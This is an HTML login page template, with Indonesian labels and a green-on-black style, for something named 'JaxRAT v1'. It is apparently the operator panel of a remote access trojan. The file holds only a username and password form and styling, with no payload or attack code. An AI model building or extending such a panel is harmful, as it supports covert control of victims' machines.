<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JaxRAT v1 - Login</title>
    <style>
        body { background-color: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { border: 2px solid #00ff00; padding: 40px; box-shadow: 0 0 20px #00ff00 inset; text-align: center; width: 300px; }
        h1 { text-shadow: 0 0 10px #00ff00; margin-bottom: 30px; font-size: 24px; }
        input { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 10px; margin: 10px 0; width: 90%; font-family: inherit; outline: none; }
        button { background-color: #000; color: #00ff00; border: 2px solid #00ff00; padding: 10px 20px; font-size: 16px; font-family: inherit; cursor: pointer; margin-top: 20px; width: 100%; transition: 0.3s; }
        button:hover { background-color: #00ff00; color: #000; box-shadow: 0 0 20px #00ff00; }
        .error { color: #ff0000; font-size: 14px; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>[ JaxRAT v1 ]</h1>
        {% if error %}
            <div class="error">{{ error }}</div>
        {% endif %}
        <form method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">AKSES SISTEM</button>
        </form>
    </div>
</body>
</html>
